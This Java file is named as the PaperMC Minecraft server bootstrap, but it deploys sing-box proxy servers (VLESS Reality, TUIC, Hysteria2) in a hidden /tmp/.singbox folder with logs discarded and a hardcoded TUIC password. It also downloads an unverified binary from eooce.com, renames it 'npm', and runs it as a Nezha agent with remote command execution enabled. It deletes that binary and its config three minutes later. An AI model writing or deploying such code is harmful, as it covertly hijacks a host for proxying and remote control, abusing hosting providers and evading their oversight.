package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.*;
import java.time.*;
import java.util.*;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;
import java.util.regex.*;

public class PaperBootstrap {

    // ========== 全局变量（类级别）==========
    private static final Path UUID_FILE = Paths.get("data/uuid.txt");
    private static String uuid;
    private static boolean DEBUG;
    private static Process singboxProcess;
    private static Map<String, Object> config;
    private static final List<String> TLS_PORTS = Arrays.asList(
            "443", "8443", "2096", "2087", "2083", "2053");
    private static final HttpClient httpClient = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(5))
            .build();
    // ======================================

    public static void main(String[] args) {
        try {
            System.out.println("config.yml 加载中...");
            config = loadConfig();

            DEBUG = Boolean.parseBoolean(config.getOrDefault("debug", "false").toString());

            // ---------- UUID 自动生成 & 持久化 ----------
            uuid = generateOrLoadUUID(config.get("uuid"));
            System.out.println("当前使用的 UUID: " + uuid);
            // --------------------------------------------
            String tuicPort = trim((String) config.get("tuic_port"));
            String hy2Port = trim((String) config.get("hy2_port"));
            String realityPort = trim((String) config.get("reality_port"));
            String sni = (String) config.getOrDefault("sni", "www.bing.com");

            boolean deployVLESS = !realityPort.isEmpty();
            boolean deployTUIC = !tuicPort.isEmpty();
            boolean deployHY2 = !hy2Port.isEmpty();

            if (!deployVLESS && !deployTUIC && !deployHY2)
                throw new RuntimeException("❌ 未设置任何协议端口！");

            Path baseDir = Paths.get("/tmp/.singbox");
            Files.createDirectories(baseDir);
            Path configJson = baseDir.resolve("config.json");
            Path cert = baseDir.resolve("cert.pem");
            Path key = baseDir.resolve("private.key");
            Path bin = baseDir.resolve("sing-box");
            Path realityKeyFile = Paths.get("reality.key");

            System.out.println("✅ config.yml 加载成功");

            generateSelfSignedCert(cert, key);
            String version = fetchLatestSingBoxVersion();
            safeDownloadSingBox(version, bin, baseDir);

            // === 固定 Reality 密钥 ===
            String privateKey = "";
            String publicKey = "";
            if (deployVLESS) {
                if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("PrivateKey:"))
                            privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("PublicKey:"))
                            publicKey = line.split(":", 2)[1].trim();
                    }
                    System.out.println("🔑 已加载本地 Reality 密钥对（固定公钥）");
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.getOrDefault("private_key", "");
                    publicKey = keys.getOrDefault("public_key", "");
                    Files.writeString(realityKeyFile,
                            "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n");
                    System.out.println("✅ Reality 密钥已保存到 reality.key");
                }
            }
            generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, cert, key,
                    privateKey, publicKey);

            // 保存 sing-box 进程 + 启动每日 00:03 重启
            singboxProcess = startSingBox(bin, configJson);
            scheduleDailyRestart(bin, configJson);

            String host = detectPublicIP();
            printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, host, publicKey);

            startNezha();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    deleteDirectory(baseDir);
                } catch (IOException ignored) {
                }
            }));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void startNezha() {
        String nezhaServer = trim((String) config.get("nezha_server"));
        String nezhaKey = trim((String) config.get("nezha_key"));
        if (nezhaServer.isEmpty() || nezhaKey.isEmpty())
            return;

        try {
            Process proc = new ProcessBuilder("ps", "aux").start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String line;
            boolean running = false;
            while ((line = reader.readLine()) != null) {
                if (line.contains("./npm") && !line.contains("grep")) {
                    running = true;
                    break;
                }
            }
            if (running) {
                info("npm is already running, skip...");
                return;
            }
        } catch (IOException e) {
            debug("Failed to check npm process: " + e.getMessage());
        }

        downloadNpm();
        String command = buildNezhaCommand();
        if (command.isEmpty())
            return;

        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
            pb.redirectErrorStream(true);
            Process nezhaProcess = pb.start();

            Thread outputThread = new Thread(() -> {
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(nezhaProcess.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (DEBUG)
                            debug("[Nezha] " + line);
                    }
                } catch (IOException e) {
                }
            });
            outputThread.setDaemon(true);
            outputThread.start();

            info("✅ nz started successfully");

            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    cleanupNezha();
                }
            }, 180000);

        } catch (IOException e) {
            error("Error running nz: " + e.getMessage());
        }
    }

    private static void cleanupNezha() {
        for (String file : Arrays.asList("npm", "config.yaml")) {
            try {
                Files.deleteIfExists(Paths.get(file));
            } catch (IOException e) {
            }
        }
    }

    private static String buildNezhaCommand() {
        String nezhaServer = trim((String) config.get("nezha_server"));
        String nezhaKey = trim((String) config.get("nezha_key"));
        String uuid = trim((String) config.get("uuid"));
        String port = nezhaServer.substring(nezhaServer.lastIndexOf(':') + 1);
        boolean tlsFlag = TLS_PORTS.contains(port);

        String config = String.format(
                "client_secret: %s\n" +
                        "debug: false\n" +
                        "disable_auto_update: true\n" +
                        "disable_command_execute: false\n" +
                        "disable_force_update: true\n" +
                        "disable_nat: false\n" +
                        "disable_send_query: false\n" +
                        "gpu: false\n" +
                        "insecure_tls: true\n" +
                        "ip_report_period: 1800\n" +
                        "report_delay: 4\n" +
                        "server: %s\n" +
                        "skip_connection_count: true\n" +
                        "skip_procs_count: true\n" +
                        "temperature: false\n" +
                        "tls: %s\n" +
                        "use_gitee_to_upgrade: false\n" +
                        "use_ipv6_country_code: false\n" +
                        "uuid: %s",
                nezhaKey, nezhaServer, tlsFlag, uuid);

        try {
            Files.writeString(Paths.get("config.yaml"), config);
        } catch (IOException e) {
            error("Failed to write config file: " + e.getMessage());
        }

        return "nohup ./npm -c config.yaml >/dev/null 2>&1 &";
    }

    private static void downloadNpm() {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (arch.contains("arm") || arch.contains("aarch64")) {
            url = "https://arm64.eooce.com/v1";
        } else {
            url = "https://amd64.eooce.com/v1";
        }

        try {
            // info("Downloading npm from: " + url);
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .timeout(Duration.ofSeconds(30))
                    .build();
            HttpResponse<byte[]> response = httpClient.send(request, HttpResponse.BodyHandlers.ofByteArray());
            if (response.statusCode() == 200) {
                Files.write(Paths.get("npm"), response.body());
                new ProcessBuilder("chmod", "755", "npm").start();
                info("✅ nz downloaded successfully");
            }
        } catch (Exception e) {
            error("Download failed: " + e.getMessage());
        }
    }

    private static String generateOrLoadUUID(Object configUuid) {
        // 1. 优先使用 config.yml（兼容旧配置）
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }

        // 2. 读取本地持久化文件
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (isValidUUID(saved)) {
                    System.out.println("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {

            System.err.println("读取 UUID 文件失败: " + e.getMessage());
        }

        // 3. 首次生成
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        System.out.println("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private static void saveUuidToFile(String uuid) {
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, uuid);
            // 防止被其他用户读取（非 root 环境仍然安全）
            UUID_FILE.toFile().setReadable(false, false);
            UUID_FILE.toFile().setReadable(true, true);
        } catch (Exception e) {
            System.err.println("保存 UUID 失败: " + e.getMessage());
        }
    }

    private static boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    // ===== 工具函数 =====
    private static String trim(String s) {
        return s == null ? "" : s.trim();
    }

    private static Map<String, Object> loadConfig() throws IOException {
        Yaml yaml = new Yaml();
        try (InputStream in = Files.newInputStream(Paths.get("config.yml"))) {
            Object o = yaml.load(in);
            if (o instanceof Map)
                return (Map<String, Object>) o;
            return new HashMap<>();
        }
    }

    // ===== 证书生成 =====
    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            System.out.println("🔑 证书已存在，跳过生成");
            return;
        }
        System.out.println("🔨 正在生成 EC 自签证书...");
        new ProcessBuilder("bash", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        System.out.println("✅ 已生成自签证书");
    }

    // ===== Reality 密钥生成 =====
    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        System.out.println("🔑 正在生成 Reality 密钥对...");
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null)
                sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        if (!priv.find() || !pub.find())
            throw new IOException("Reality 密钥生成失败：" + out);
        Map<String, String> map = new HashMap<>();
        map.put("private_key", priv.group(1));
        map.put("public_key", pub.group(1));
        System.out.println("✅ Reality 密钥生成完成");
        return map;
    }

    // ===== 配置生成 =====
    private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
            String tuicPort, String hy2Port, String realityPort,
            String sni, Path cert, Path key,
            String privateKey, String publicKey) throws IOException {

        List<String> inbounds = new ArrayList<>();

        if (tuic) {
            inbounds.add("""
                      {
                        "type": "tuic",
                        "listen": "::",
                        "listen_port": %s,
                        "users": [{"uuid": "%s", "password": "eishare2025"}],
                        "congestion_control": "bbr",
                        "tls": {
                          "enabled": true,
                          "alpn": ["h3"],
                          "certificate_path": "%s",
                          "key_path": "%s"
                        }
                      }
                    """.formatted(tuicPort, uuid, cert, key));
        }

        if (hy2) {
            inbounds.add("""
                      {
                        "type": "hysteria2",
                        "listen": "::",
                        "listen_port": %s,
                        "users": [{"password": "%s"}],
                        "masquerade": "https://bing.com",
                        "ignore_client_bandwidth": true,
                        "up_mbps": 1000,
                        "down_mbps": 1000,
                        "tls": {
                          "enabled": true,
                          "alpn": ["h3"],
                          "insecure": true,
                          "certificate_path": "%s",
                          "key_path": "%s"
                        }
                      }
                    """.formatted(hy2Port, uuid, cert, key));
        }

        if (vless) {
            inbounds.add("""
                      {
                        "type": "vless",
                        "listen": "::",
                        "listen_port": %s,
                        "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                        "tls": {
                          "enabled": true,
                          "server_name": "%s",
                          "reality": {
                            "enabled": true,
                            "handshake": {"server": "%s", "server_port": 443},
                            "private_key": "%s",
                            "short_id": [""]
                          }
                        }
                      }
                    """.formatted(realityPort, uuid, sni, sni, privateKey));
        }

        String json = """
                {
                  "log": { "level": "info" },
                  "inbounds": [%s],
                  "outbounds": [{"type": "direct"}]
                }
                """.formatted(String.join(",", inbounds));

        Files.writeString(configFile, json);
        System.out.println("✅ sing-box 配置生成完成");
    }

    // ===== 版本检测 =====
    private static String fetchLatestSingBoxVersion() {
        String fallback = "1.12.12";
        try {
            URL url = URI.create("https://api.github.com/repos/SagerNet/sing-box/releases/latest").toURL();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().reduce("", (a, b) -> a + b);
                int i = json.indexOf("\"tag_name\":\"v");
                if (i != -1) {
                    String v = json.substring(i + 13, json.indexOf("\"", i + 13));
                    System.out.println("🔍 最新版本: " + v);
                    return v;
                }
            }
        } catch (Exception e) {
            System.out.println("⚠️ 获取版本失败，使用回退版本 " + fallback);
        }
        return fallback;
    }

    // ===== 下载 sing-box =====
    private static void safeDownloadSingBox(String version, Path bin, Path dir)
            throws IOException, InterruptedException {
        if (Files.exists(bin))
            return;
        String arch = detectArch();
        String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;

        System.out.println("⬇️ 下载 sing-box: " + url);
        Path tar = dir.resolve(file);
        new ProcessBuilder("bash", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
        new ProcessBuilder("bash", "-c",
                "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
                        "(find . -type f -name 'sing-box' -exec mv {} ./sing-box \\; ) && chmod +x sing-box || true")
                .inheritIO().start().waitFor();

        if (!Files.exists(bin))
            throw new IOException("未找到 sing-box 可执行文件！");
        System.out.println("✅ 成功解压 sing-box 可执行文件");
    }

    private static String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        if (a.contains("aarch") || a.contains("arm"))
            return "arm64";
        return "amd64";
    }

    // ===== 启动 =====
    private static Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
        System.out.println("正在启动 sing-box...");
        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
        pb.redirectErrorStream(true);
        // 不写日志 → 直接输出到控制台
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        Process p = pb.start();
        Thread.sleep(1500);
        System.out.println("sing-box 已启动，PID: " + p.pid());
        return p;
    }

    // ===== 输出节点 =====
    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(URI.create("https://api.ipify.org").toURL().openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            return "your-server-ip";
        }
    }

    private static void printDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
            String tuicPort, String hy2Port, String realityPort,
            String sni, String host, String publicKey) {
        System.out.println("\n=== ✅ 已部署节点链接 ===");
        if (vless)
            System.out.printf(
                    "VLESS Reality:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#Reality\n",
                    uuid, host, realityPort, sni, publicKey);
        if (tuic)
            System.out.printf(
                    "\nTUIC:\ntuic://%s:eishare2025@%s:%s?sni=%s&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC\n",
                    uuid, host, tuicPort, sni);
        if (hy2)
            System.out.printf("\nHysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#Hysteria2\n",
                    uuid, host, hy2Port, sni);
    }

    // ===== 每日北京时间 00:03 重启 sing-box（无日志、控制台实时输出）=====
    private static void scheduleDailyRestart(Path bin, Path cfg) {
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

        Runnable restartTask = () -> {
            System.out.println("\n[定时重启Sing-box] 北京时间 00:03，准备重启 sing-box...");

            // 1. 优雅停止旧进程
            if (singboxProcess != null && singboxProcess.isAlive()) {
                System.out.println("正在停止旧进程 (PID: " + singboxProcess.pid() + ")...");
                singboxProcess.destroy(); // 发送 SIGTERM
                try {
                    if (!singboxProcess.waitFor(10, TimeUnit.SECONDS)) {
                        System.out.println("进程未响应，强制终止...");
                        singboxProcess.destroyForcibly();
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }

            // 2. 启动新进程
            try {
                ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
                pb.redirectErrorStream(true);
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                singboxProcess = pb.start();
                System.out.println("sing-box 重启成功，新 PID: " + singboxProcess.pid());
            } catch (Exception e) {
                System.err.println("重启失败: " + e.getMessage());
                e.printStackTrace();
            }
        };

        ZoneId zone = ZoneId.of("Asia/Shanghai");
        LocalDateTime now = LocalDateTime.now(zone);
        LocalDateTime next = now.withHour(0).withMinute(3).withSecond(0).withNano(0);
        if (!next.isAfter(now))
            next = next.plusDays(1);

        long initialDelay = Duration.between(now, next).getSeconds();

        scheduler.scheduleAtFixedRate(restartTask, initialDelay, 86_400, TimeUnit.SECONDS);

        System.out.printf("[定时重启Sing-box] 已计划每日 00:03 重启（首次执行：%s）%n",
                next.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")));
    }

    private static void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir))
            return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }

    private static void log(String level, String msg) {
        if (!level.equals("INFO"))
            return;
        System.out.println(new Date() + " - " + level + " - " + msg);
    }

    private static void info(String msg) {
        log("INFO", msg);
    }

    private static void error(String msg) {
        log("ERROR", msg);
    }

    private static void debug(String msg) {
        if (DEBUG)
            log("DEBUG", msg);
    }
}
